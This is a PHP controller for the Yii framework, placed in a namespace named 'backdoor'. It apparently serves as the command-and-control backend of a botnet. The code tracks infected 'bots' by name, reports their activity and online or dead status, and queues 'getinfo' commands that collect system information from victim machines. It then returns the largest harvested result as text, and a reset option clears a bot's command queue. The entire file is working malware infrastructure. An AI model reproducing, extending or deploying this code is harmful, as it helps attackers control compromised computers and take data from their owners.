<?php

namespace backdoor\controllers;

use Yii;
use yii\rest\Controller;
use common\models\Bots;
use common\models\Commands;
use yii\web\Request;
use yii\db\Expression;

class SiteController extends Controller
{
    public $res;
    public $tabs;

    public function actionIndex()
    {
        
        $res = '';
        $tabs = -1;

        Yii::$app->response->format = \yii\web\Response::FORMAT_RAW;
        Yii::$app->response->headers->add('Content-Type', 'text/plain');

        $request = Yii::$app->request->queryParams;
        if(!isset($request['bot'])){
            http_response_code(404);
            die();
        }

        $botId = Bots::findByBotName($request['bot']);

        if(!$botId){
            http_response_code(404);
            die();
        }else{
            if(!isset($request['options'])){
                http_response_code(404);
                die();
            }else{
                if($request['options']=='status'){
                    $answer = '';
                    $status = [
                        'offline',
                        'online',
                        'dead',
                        'newbie',
                    ];
                    $busy = [
                        'unlocked',
                        'locked',
                    ];

                    $m = Bots::findOne(['id'=>$botId]);
                    //$m->testdate = new Expression('NOW()');

                    $answer .= 'First activity : '.$m->created_at.chr(13).chr(10);
                    $answer .= 'Last activity : '.$m->updated_at.chr(13).chr(10);
                    $answer .= 'Last tested : '.$m->testdate.chr(13).chr(10);
                    if(isset($m->status) && isset($m->busy)){
                        $answer .= 'Status : '.$status[$m->status].':'.$busy[$m->busy].chr(13).chr(10);
                    }
                    $c = Commands::find() // find 
                        ->where(['bot_id'=>$botId]) // to this bot
                        ->andWhere(['commandtype'=>1]) // just one command getsysteminfo
                        ->andWhere(['status'=>2]) //  that allready done
                        ->andFilterWhere(['>','created_at', $m->testdate])
                        ->all();
                        
                    if($c){ // if just one system info command exist
                        /*
                        if(isset($c->status)){
                            if($c->status==0){
                                http_response_code(404);
                                die();
                            }
                        }else{
                            http_response_code(404);
                            die();
                        }*/
                        $answer .= 'System Info : '.chr(13).chr(10);
                        $maxAnswer = '';
                        foreach ($c as $key => $value) { // search for longest result
                            $maxAnswer = (strlen($value['result']) > strlen($maxAnswer)) ? $value['result'] : $maxAnswer;
                        }
                        parse_str($maxAnswer,$arr);
                        $this->displayArray($arr);
                        $answer .= $this->res;
                    }else{
                        if($m->busy==0){
                            $cc = New Commands();
                            $cc->created_at = new Expression('NOW()');
                            $cc->bot_id = $botId;
                            $cc->command = '1';
                            $cc->status = 0;
                            $cc->admin = 1;
                            $cc->commandtype = 1;
                            $cc->usercommand = 'getinfo';
                            $cc->save(false);

                            $m->busy = 1;
                            $m->save(false);
                        }
                        http_response_code(404);
                        die();
                    }
                }elseif($request['options']=='reset'){
                    //Bots::deleteAll(['id' => $botId]);
                    Commands::updateAll(['status' => 2],['bot_id' => $botId]);
                    $m = Bots::findOne(['id'=>$botId]);
                    $m->testdate = new Expression('NOW()');
                    $m->status = 0;
                    $m->busy = 0;
                    $m->save(false); 
                    http_response_code(200);
                    die();
                }else{
                    http_response_code(404);
                    die();
                }
            }
            
            //$m->testdate = new Expression('NOW()');
            //$m->save(false);
            //$answer .= 'Listing requested at : '.$m->testdate.chr(13).chr(10);

            return $answer;
        }
        
        
    }


    private function displayArray($array)
    {
        foreach ($array as $key => $value) {
            
            if(gettype($value)=='array'){
                
                $this->res .= $key.':'.chr(13).chr(10);
                $this->tabs++;
        
                $this->displayArray($value);
                
            }else{
                if(!is_numeric($key)){
                    $this->res .= $key.':';
                }
                
                $haveNoTags = str_replace('<DIR>', '&lt;DIR>', $value);
                $this->res .= str_repeat(chr(9), $this->tabs).rawurldecode($haveNoTags).chr(13).chr(10);
                // wordwrap($text, 20, "<br />\n");
                
            }
            
        }
        $this->tabs = ($this->tabs>0) ? $this->tabs-1 : $this->tabs;
        
    }
}
